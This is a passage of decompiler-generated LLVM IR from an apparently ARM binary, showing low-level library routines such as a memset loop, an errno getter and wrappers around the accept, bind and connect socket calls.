  uselistorder i32 (i32)* @function_12e9c, { 29, 28, 27, 12, 16, 15, 11, 10, 14, 13, 9, 8, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 26, 25, 24, 23, 22, 21, 4, 20, 19, 18, 17, 7, 6, 5, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_13390, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13360, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_133a0(i32* %arg1) local_unnamed_addr {
dec_label_pc_133a0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_133a0 = load i32, i32* @r4, align 4
  %v6_133a0 = load i32, i32* @r5, align 4
  %v9_133a0 = load i32, i32* @lr, align 4
  %v1_133a4 = add i32 %tmp, 24
  store i32 %v1_133a4, i32* @r4, align 4
  %v2_133a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 83164, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_133a8, i32* @r0, align 4
  store i32 %v1_133a4, i32* %r2.global-to-local, align 4
  %v8_133c4 = call i32 @function_144dc(i32 %v2_133a8, i32 ptrtoint (i32* @global_var_144d4.572 to i32), i32 %v1_133a4, i32 83164, i32 %v3_133a0, i32 %v6_133a0, i32 %v9_133a0)
  %v0_133c8 = load i32, i32* @r4, align 4
  store i32 %v0_133c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144d4.572 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_133d8.581 to i32), i32* @lr, align 4
  %v1_133d4 = call i32 @function_144d4()
  store i32 %v1_133d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_1340c, %dec_label_pc_133a0
  %v0_133d8 = load i32, i32* @r5, align 4
  %v1_133d8 = add i32 %v0_133d8, 4
  %v2_133d8 = inttoptr i32 %v1_133d8 to i32*
  %v3_133d8 = load i32, i32* %v2_133d8, align 4
  store i32 %v3_133d8, i32* %r2.global-to-local, align 4
  %v4_133d8 = add i32 %v0_133d8, 8
  %v5_133d8 = inttoptr i32 %v4_133d8 to i32*
  %v6_133d8 = load i32, i32* %v5_133d8, align 4
  store i32 %v6_133d8, i32* %r3.global-to-local, align 4
  %tmp8 = icmp ugt i32 %v6_133d8, %v3_133d8
  br i1 %tmp8, label %dec_label_pc_1340c, label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133d8
  %v1_133e4 = inttoptr i32 %v0_133d8 to i32*
  %v2_133e4 = load i32, i32* %v1_133e4, align 4
  store i32 %v2_133e4, i32* @r0, align 4
  %v1_133e8 = add i32 %v0_133d8, 12
  %v2_133e8 = inttoptr i32 %v1_133e8 to i32*
  %v3_133e8 = load i32, i32* %v2_133e8, align 4
  %v1_133ec = add i32 %v0_133d8, 20
  %v2_133ec = inttoptr i32 %v1_133ec to i32*
  %v3_133ec = load i32, i32* %v2_133ec, align 4
  store i32 %v3_133ec, i32* @r2, align 4
  %v4_133f0 = call i32 @function_14950(i32 %v2_133e4, i32 %v3_133e8, i32 %v3_133ec, i32 %v6_133d8)
  store i32 %v4_133f0, i32* %r0.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_133f0, 1
  br i1 %tmp7, label %.thread, label %dec_label_pc_13400

.thread:                                          ; preds = %dec_label_pc_133e4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13440

dec_label_pc_13400:                               ; preds = %dec_label_pc_133e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13404 = load i32, i32* @r5, align 4
  %v2_13404 = add i32 %v1_13404, 4
  %v3_13404 = inttoptr i32 %v2_13404 to i32*
  store i32 0, i32* %v3_13404, align 4
  %v1_13408 = load i32, i32* @r5, align 4
  %v2_13408 = add i32 %v1_13408, 8
  %v3_13408 = inttoptr i32 %v2_13408 to i32*
  store i32 %v4_133f0, i32* %v3_13408, align 4
  %v0_1340c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133d8, %dec_label_pc_13400
  %v1_13424 = phi i32 [ %v0_133d8, %dec_label_pc_133d8 ], [ %v0_1340c.pre, %dec_label_pc_13400 ]
  %v1_1340c = add i32 %v1_13424, 4
  %v2_1340c = inttoptr i32 %v1_1340c to i32*
  %v3_1340c = load i32, i32* %v2_1340c, align 4
  store i32 %v3_1340c, i32* %r2.global-to-local, align 4
  %v1_13410 = add i32 %v1_13424, 12
  %v2_13410 = inttoptr i32 %v1_13410 to i32*
  %v3_13410 = load i32, i32* %v2_13410, align 4
  store i32 %v3_13410, i32* %ip.global-to-local, align 4
  %v2_13414 = add i32 %v3_13410, %v3_1340c
  store i32 %v2_13414, i32* @r4, align 4
  %v1_13418 = add i32 %v2_13414, 4
  %v2_13418 = inttoptr i32 %v1_13418 to i32*
  %v3_13418 = load i32, i32* %v2_13418, align 4
  %v1_1341c = add i32 %v2_13414, 8
  %v2_1341c = inttoptr i32 %v1_1341c to i8*
  %v3_1341c = load i8, i8* %v2_1341c, align 1
  %v4_1341c = zext i8 %v3_1341c to i32
  store i32 %v4_1341c, i32* %r3.global-to-local, align 4
  %v1_13420 = add i32 %v2_13414, 9
  %v2_13420 = inttoptr i32 %v1_13420 to i8*
  %v3_13420 = load i8, i8* %v2_13420, align 1
  %v4_13420 = zext i8 %v3_13420 to i32
  store i32 %v4_13420, i32* %r0.global-to-local, align 4
  %v2_13424 = add i32 %v1_13424, 16
  %v3_13424 = inttoptr i32 %v2_13424 to i32*
  store i32 %v3_13418, i32* %v3_13424, align 4
  %v0_13428 = load i32, i32* %r2.global-to-local, align 4
  %v1_13428 = load i32, i32* %ip.global-to-local, align 4
  %v2_13428 = add i32 %v1_13428, %v0_13428
  %v3_13428 = inttoptr i32 %v2_13428 to i32*
  %v4_13428 = load i32, i32* %v3_13428, align 4
  %v0_1342c = load i32, i32* %r3.global-to-local, align 4
  %v1_1342c = load i32, i32* %r0.global-to-local, align 4
  %v4_1342c = mul i32 %v1_1342c, 256
  %v5_1342c = or i32 %v4_1342c, %v0_1342c
  store i32 %v5_1342c, i32* %r3.global-to-local, align 4
  %v2_13430 = add i32 %v5_1342c, %v0_13428
  store i32 %v2_13430, i32* @r2, align 4
  %v2_13434 = icmp eq i32 %v4_13428, 0
  %v1_13438 = load i32, i32* @r5, align 4
  %v2_13438 = add i32 %v1_13438, 4
  %v3_13438 = inttoptr i32 %v2_13438 to i32*
  store i32 %v2_13430, i32* %v3_13438, align 4
  br i1 %v2_13434, label %dec_label_pc_133d8, label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %dec_label_pc_1340c, %.thread
  store i32 %v2_133a8, i32* @r0, align 4
  store i32 83164, i32* %r3.global-to-local, align 4
  store i32 78932, i32* @lr, align 4
  %v3_13450 = load i32, i32* @r2, align 4
  %v8_13450 = call i32 @function_144dc(i32 %v2_133a8, i32 1, i32 %v3_13450, i32 83164, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13454 = load i32, i32* @r4, align 4
  store i32 %v0_13454, i32* %r0.global-to-local, align 4
  store i32 %v3_133a0, i32* @r4, align 4
  store i32 %v6_133a0, i32* @r5, align 4
  ret i32 %v0_13454

; uselistorder directives
  uselistorder i32 %v1_13424, { 0, 2, 1 }
  uselistorder i32 %v6_133d8, { 1, 0, 2 }
  uselistorder i32 %v0_133d8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_133a8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_133a4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_1340c, { 1, 0 }
}

define i32 @function_13470() local_unnamed_addr {
dec_label_pc_13470:
  ret i32 ptrtoint (i32* @global_var_1e460.584 to i32)
}

define i32 @function_1347c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1347c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v1_13488 = bitcast i32* %stack_var_-20 to %tms*
  %v2_13488 = call i32 @function_14ce0(%tms* %v1_13488)
  %v2_13490 = load i32, i32* %stack_var_-20, align 4
  %v2_13494 = add i32 %v2_13490, %tmp
  %v2_1349c = mul i32 %v2_13494, 10000
  %v1_134a0 = and i32 %v2_1349c, 2147483632
  ret i32 %v1_134a0

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_134b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_134b0:
  %v0_134b0 = call i32 @function_150f0()
  ret i32 %v0_134b0
}

define i32 @function_134c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_134c0:
  %v0_134c0 = call i32 @function_150f0()
  ret i32 %v0_134c0

; uselistorder directives
  uselistorder i32 ()* @function_150f0, { 1, 0 }
}

define i32 @function_134d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_134d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_134d4 = load i32, i32* @r2, align 4
  %v8_134d4 = icmp eq i32 %v0_134d4, 8
  store i1 %v8_134d4, i1* %cpsr_z.global-to-local, align 1
  %v5_134d8 = icmp slt i32 %v0_134d4, 8
  br i1 %v5_134d8, label %dec_label_pc_13538, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134d0
  %v4_134dc = mul i32 %arg2, 256
  %v5_134dc = or i32 %v4_134dc, %arg2
  %v4_134e0 = mul i32 %v5_134dc, 65536
  %v5_134e0 = or i32 %v4_134e0, %v5_134dc
  store i32 %v5_134e0, i32* %r1.global-to-local, align 4
  %v1_134e457 = urem i32 %tmp, 4
  %v2_134e458 = icmp eq i32 %v1_134e457, 0
  store i1 %v2_134e458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_134e458, label %dec_label_pc_134f4, label %bb

bb:                                               ; preds = %dec_label_pc_134dc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_134dc ]
  %v3_134e859 = phi i32 [ %v6_134e8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_134dc ]
  %v4_134e8 = inttoptr i32 %v3_134e859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_134e8, align 1
  %v5_134e8 = load i32, i32* %r3.global-to-local, align 4
  %v6_134e8 = add i32 %v5_134e8, 1
  store i32 %v6_134e8, i32* %r3.global-to-local, align 4
  %v0_134ec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_134f8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_134ec.pr, label %dec_label_pc_134f4, label %.thread

.thread:                                          ; preds = %bb
  %v2_134ec = add i32 %v0_134f8.pr.pre, -1
  store i32 %v2_134ec, i32* @r2, align 4
  %v1_134e4 = urem i32 %v6_134e8, 4
  %v2_134e4 = icmp eq i32 %v1_134e4, 0
  store i1 %v2_134e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134e4, label %dec_label_pc_134f4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_134e8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_134e8.pre to i8
  br label %bb

dec_label_pc_134f4:                               ; preds = %.thread, %bb, %dec_label_pc_134dc
  %v0_1350028 = phi i32 [ %tmp, %dec_label_pc_134dc ], [ %v6_134e8, %bb ], [ %v6_134e8, %.thread ]
  %v0_134f8.pr = phi i32 [ %v0_134d4, %dec_label_pc_134dc ], [ %v0_134f8.pr.pre, %bb ], [ %v2_134ec, %.thread ]
  %v0_134f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_134f4, i32* %ip.global-to-local, align 4
  %v8_134f810 = icmp eq i32 %v0_134f8.pr, 8
  store i1 %v8_134f810, i1* %cpsr_z.global-to-local, align 1
  %v5_134fc11 = icmp slt i32 %v0_134f8.pr, 8
  br i1 %v5_134fc11, label %dec_label_pc_13538, label %dec_label_pc_13500.preheader

dec_label_pc_13500.preheader:                     ; preds = %dec_label_pc_134f4
  %v1_1350046 = inttoptr i32 %v0_1350028 to i32*
  store i32 %v0_134f4, i32* %v1_1350046, align 4
  %v3_1350047 = add i32 %v0_1350028, 4
  %v4_1350048 = inttoptr i32 %v3_1350047 to i32*
  %v5_1350049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1350049, i32* %v4_1350048, align 4
  %v6_1350050 = add i32 %v0_1350028, 8
  store i32 %v6_1350050, i32* %r3.global-to-local, align 4
  %v0_1350451 = load i32, i32* @r2, align 4
  %v1_1350452 = add i32 %v0_1350451, -8
  store i32 %v1_1350452, i32* %r2.global-to-local, align 4
  %v5_1350c53 = icmp slt i32 %v1_1350452, 8
  br i1 %v5_1350c53, label %dec_label_pc_13500.dec_label_pc_13538.loopexit_crit_edge, label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_13500.preheader, %dec_label_pc_134f8.dec_label_pc_13500_crit_edge
  %v6_1350055 = phi i32 [ %v6_13500, %dec_label_pc_134f8.dec_label_pc_13500_crit_edge ], [ %v6_1350050, %dec_label_pc_13500.preheader ]
  %v0_1350054 = phi i32 [ %v12_1352c, %dec_label_pc_134f8.dec_label_pc_13500_crit_edge ], [ %v0_1350028, %dec_label_pc_13500.preheader ]
  %v1_13510 = inttoptr i32 %v6_1350055 to i32*
  %v2_13510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13510, i32* %v1_13510, align 4
  %v3_13510 = add i32 %v0_1350054, 12
  %v4_13510 = inttoptr i32 %v3_13510 to i32*
  %v5_13510 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13510, i32* %v4_13510, align 4
  %v6_13510 = add i32 %v0_1350054, 16
  store i32 %v6_13510, i32* %r3.global-to-local, align 4
  %v0_13514 = load i32, i32* %r2.global-to-local, align 4
  %v1_13514 = add i32 %v0_13514, -8
  store i32 %v1_13514, i32* %r2.global-to-local, align 4
  %v5_1351c = icmp slt i32 %v1_13514, 8
  br i1 %v5_1351c, label %dec_label_pc_13510.dec_label_pc_13538.loopexit_crit_edge, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13510
  %v1_13520 = inttoptr i32 %v6_13510 to i32*
  %v2_13520 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13520, i32* %v1_13520, align 4
  %v3_13520 = add i32 %v0_1350054, 20
  %v4_13520 = inttoptr i32 %v3_13520 to i32*
  %v5_13520 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13520, i32* %v4_13520, align 4
  %v6_13520 = add i32 %v0_1350054, 24
  store i32 %v6_13520, i32* %r3.global-to-local, align 4
  %v0_13524 = load i32, i32* %r2.global-to-local, align 4
  %v1_13524 = add i32 %v0_13524, -8
  store i32 %v1_13524, i32* %r2.global-to-local, align 4
  %v5_1352c = icmp slt i32 %v1_13524, 8
  br i1 %v5_1352c, label %dec_label_pc_13520.dec_label_pc_13538.loopexit_crit_edge, label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_13520
  %v7_1352c = inttoptr i32 %v6_13520 to i32*
  %v8_1352c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1352c, i32* %v7_1352c, align 4
  %v9_1352c = add i32 %v0_1350054, 28
  %v10_1352c = inttoptr i32 %v9_1352c to i32*
  %v11_1352c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1352c, i32* %v10_1352c, align 4
  %v12_1352c = add i32 %v0_1350054, 32
  store i32 %v12_1352c, i32* %r3.global-to-local, align 4
  %v6_13530 = load i32, i32* %r2.global-to-local, align 4
  %v7_13530 = add i32 %v6_13530, -8
  store i32 %v7_13530, i32* %r2.global-to-local, align 4
  %v5_134fc = icmp slt i32 %v7_13530, 8
  br i1 %v5_134fc, label %dec_label_pc_134f8.dec_label_pc_13538.loopexit_crit_edge, label %dec_label_pc_134f8.dec_label_pc_13500_crit_edge

dec_label_pc_134f8.dec_label_pc_13500_crit_edge:  ; preds = %dec_label_pc_134f8
  %v2_13500.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13500 = inttoptr i32 %v12_1352c to i32*
  store i32 %v2_13500.pre, i32* %v1_13500, align 4
  %v3_13500 = add i32 %v0_1350054, 36
  %v4_13500 = inttoptr i32 %v3_13500 to i32*
  %v5_13500 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13500, i32* %v4_13500, align 4
  %v6_13500 = add i32 %v0_1350054, 40
  store i32 %v6_13500, i32* %r3.global-to-local, align 4
  %v0_13504 = load i32, i32* %r2.global-to-local, align 4
  %v1_13504 = add i32 %v0_13504, -8
  store i32 %v1_13504, i32* %r2.global-to-local, align 4
  %v5_1350c = icmp slt i32 %v1_13504, 8
  br i1 %v5_1350c, label %dec_label_pc_13500.dec_label_pc_13538.loopexit_crit_edge, label %dec_label_pc_13510

dec_label_pc_13500.dec_label_pc_13538.loopexit_crit_edge: ; preds = %dec_label_pc_134f8.dec_label_pc_13500_crit_edge, %dec_label_pc_13500.preheader
  %v1_13504.lcssa = phi i32 [ %v1_1350452, %dec_label_pc_13500.preheader ], [ %v1_13504, %dec_label_pc_134f8.dec_label_pc_13500_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13538

dec_label_pc_134f8.dec_label_pc_13538.loopexit_crit_edge: ; preds = %dec_label_pc_134f8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13538

dec_label_pc_13510.dec_label_pc_13538.loopexit_crit_edge: ; preds = %dec_label_pc_13510
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13538

dec_label_pc_13520.dec_label_pc_13538.loopexit_crit_edge: ; preds = %dec_label_pc_13520
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %dec_label_pc_134f4, %dec_label_pc_13500.dec_label_pc_13538.loopexit_crit_edge, %dec_label_pc_134f8.dec_label_pc_13538.loopexit_crit_edge, %dec_label_pc_13510.dec_label_pc_13538.loopexit_crit_edge, %dec_label_pc_13520.dec_label_pc_13538.loopexit_crit_edge, %dec_label_pc_134d0
  %v0_13540 = phi i32 [ %v0_134d4, %dec_label_pc_134d0 ], [ %v1_13524, %dec_label_pc_13520.dec_label_pc_13538.loopexit_crit_edge ], [ %v1_13514, %dec_label_pc_13510.dec_label_pc_13538.loopexit_crit_edge ], [ %v7_13530, %dec_label_pc_134f8.dec_label_pc_13538.loopexit_crit_edge ], [ %v1_13504.lcssa, %dec_label_pc_13500.dec_label_pc_13538.loopexit_crit_edge ], [ %v0_134f8.pr, %dec_label_pc_134f4 ]
  %v2_13538 = icmp eq i32 %v0_13540, 0
  store i1 %v2_13538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13538, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13538
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13538
  %v1_13540 = sub i32 7, %v0_13540
  store i32 %v1_13540, i32* %r2.global-to-local, align 4
  %v3_13544 = mul i32 %v1_13540, 4
  %v4_13544 = add i32 %v3_13544, ptrtoint (i32* @global_var_1354c.586 to i32)
  call void @__pseudo_branch(i32 %v4_13544)
  %v0_1354c = load i32, i32* %r1.global-to-local, align 4
  %v1_1354c = trunc i32 %v0_1354c to i8
  %v2_1354c = load i32, i32* %r3.global-to-local, align 4
  %v3_1354c = inttoptr i32 %v2_1354c to i8*
  store i8 %v1_1354c, i8* %v3_1354c, align 1
  %v4_1354c = load i32, i32* %r3.global-to-local, align 4
  %v5_1354c = add i32 %v4_1354c, 1
  store i32 %v5_1354c, i32* %r3.global-to-local, align 4
  %v0_13550 = load i32, i32* %r1.global-to-local, align 4
  %v1_13550 = trunc i32 %v0_13550 to i8
  %v3_13550 = inttoptr i32 %v5_1354c to i8*
  store i8 %v1_13550, i8* %v3_13550, align 1
  %v4_13550 = load i32, i32* %r3.global-to-local, align 4
  %v5_13550 = add i32 %v4_13550, 1
  store i32 %v5_13550, i32* %r3.global-to-local, align 4
  %v0_13554 = load i32, i32* %r1.global-to-local, align 4
  %v1_13554 = trunc i32 %v0_13554 to i8
  %v3_13554 = inttoptr i32 %v5_13550 to i8*
  store i8 %v1_13554, i8* %v3_13554, align 1
  %v4_13554 = load i32, i32* %r3.global-to-local, align 4
  %v5_13554 = add i32 %v4_13554, 1
  store i32 %v5_13554, i32* %r3.global-to-local, align 4
  %v0_13558 = load i32, i32* %r1.global-to-local, align 4
  %v1_13558 = trunc i32 %v0_13558 to i8
  %v3_13558 = inttoptr i32 %v5_13554 to i8*
  store i8 %v1_13558, i8* %v3_13558, align 1
  %v4_13558 = load i32, i32* %r3.global-to-local, align 4
  %v5_13558 = add i32 %v4_13558, 1
  store i32 %v5_13558, i32* %r3.global-to-local, align 4
  %v0_1355c = load i32, i32* %r1.global-to-local, align 4
  %v1_1355c = trunc i32 %v0_1355c to i8
  %v3_1355c = inttoptr i32 %v5_13558 to i8*
  store i8 %v1_1355c, i8* %v3_1355c, align 1
  %v4_1355c = load i32, i32* %r3.global-to-local, align 4
  %v5_1355c = add i32 %v4_1355c, 1
  store i32 %v5_1355c, i32* %r3.global-to-local, align 4
  %v0_13560 = load i32, i32* %r1.global-to-local, align 4
  %v1_13560 = trunc i32 %v0_13560 to i8
  %v3_13560 = inttoptr i32 %v5_1355c to i8*
  store i8 %v1_13560, i8* %v3_13560, align 1
  %v4_13560 = load i32, i32* %r3.global-to-local, align 4
  %v5_13560 = add i32 %v4_13560, 1
  store i32 %v5_13560, i32* %r3.global-to-local, align 4
  %v0_13564 = load i32, i32* %r1.global-to-local, align 4
  %v1_13564 = trunc i32 %v0_13564 to i8
  %v3_13564 = inttoptr i32 %v5_13560 to i8*
  store i8 %v1_13564, i8* %v3_13564, align 1
  %v4_13564 = load i32, i32* %r3.global-to-local, align 4
  %v5_13564 = add i32 %v4_13564, 1
  store i32 %v5_13564, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13500, { 1, 0 }
  uselistorder i32 %v12_1352c, { 1, 2, 0 }
  uselistorder i32 %v0_1350054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_134f8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_134e8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_134dc, { 1, 0 }
  uselistorder i32 %v0_134d4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 2, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13538, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13510, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_13570(i32 %arg1) local_unnamed_addr {
dec_label_pc_13570:
  %stack_var_-8 = alloca i32, align 4
  %v2_13574 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13574, i32* @r1, align 4
  %v0_1357c = call i32 @function_15580()
  %v2_13580 = icmp eq i32 %v0_1357c, 0
  br i1 %v2_13580, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13570
  %v3_13588 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13570, %bb
  %v5_13590 = phi i32 [ -1, %dec_label_pc_13570 ], [ %v3_13588, %bb ]
  ret i32 %v5_13590

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13594(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13594:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13594 = load i32, i32* @r4, align 4
  store i32 %v3_13594, i32* %stack_var_-8, align 4
  %v5_13598 = inttoptr i32 %arg3 to i32*
  %v6_13598 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_13598)
  store i32 %v6_13598, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_13598, -4095
  br i1 %tmp, label %dec_label_pc_135b8, label %dec_label_pc_135a8

dec_label_pc_135a8:                               ; preds = %dec_label_pc_13594
  %v0_135a8 = call i32 @function_13470()
  %v0_135ac = load i32, i32* %r4.global-to-local, align 4
  %v1_135ac = sub i32 0, %v0_135ac
  %v2_135b0 = inttoptr i32 %v0_135a8 to i32*
  store i32 %v1_135ac, i32* %v2_135b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %dec_label_pc_13594, %dec_label_pc_135a8
  %v0_135b8 = phi i32 [ %v6_13598, %dec_label_pc_13594 ], [ -1, %dec_label_pc_135a8 ]
  %v2_135bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_135bc, i32* @r4, align 4
  ret i32 %v0_135b8

; uselistorder directives
  uselistorder i32 %v6_13598, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135b8, { 1, 0 }
}

define i32 @function_135c0(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_135c0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_135c0 = load i32, i32* @r4, align 4
  store i32 %v3_135c0, i32* %stack_var_-8, align 4
  %v5_135c4 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_135c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_135c4, -4095
  br i1 %tmp, label %dec_label_pc_135e4, label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135c0
  %v0_135d4 = call i32 @function_13470()
  %v0_135d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_135d8 = sub i32 0, %v0_135d8
  %v2_135dc = inttoptr i32 %v0_135d4 to i32*
  store i32 %v1_135d8, i32* %v2_135dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %dec_label_pc_135c0, %dec_label_pc_135d4
  %v0_135e4 = phi i32 [ %v5_135c4, %dec_label_pc_135c0 ], [ -1, %dec_label_pc_135d4 ]
  %v2_135e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_135e8, i32* @r4, align 4
  ret i32 %v0_135e4

; uselistorder directives
  uselistorder i32 %v5_135c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135e4, { 1, 0 }
}

define i32 @function_135ec(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_135ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_135ec = load i32, i32* @r4, align 4
  store i32 %v3_135ec, i32* %stack_var_-8, align 4
  %v5_135f0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_135f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_135f0, -4095
  br i1 %tmp, label %dec_label_pc_13610, label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_135ec
  %v0_13600 = call i32 @function_13470()
  %v0_13604 = load i32, i32* %r4.global-to-local, align 4
  %v1_13604 = sub i32 0, %v0_13604
  %v2_13608 = inttoptr i32 %v0_13600 to i32*
  store i32 %v1_13604, i32* %v2_13608, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_135ec, %dec_label_pc_13600
  %v0_13610 = phi i32 [ %v5_135f0, %dec_label_pc_135ec ], [ -1, %dec_label_pc_13600 ]
  %v2_13614 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13614, i32* @r4, align 4
  ret i32 %v0_13610

; uselistorder directives
  uselistorder i32 %v5_135f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13610, { 1, 0 }
}

define i32 @function_13618(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13618:
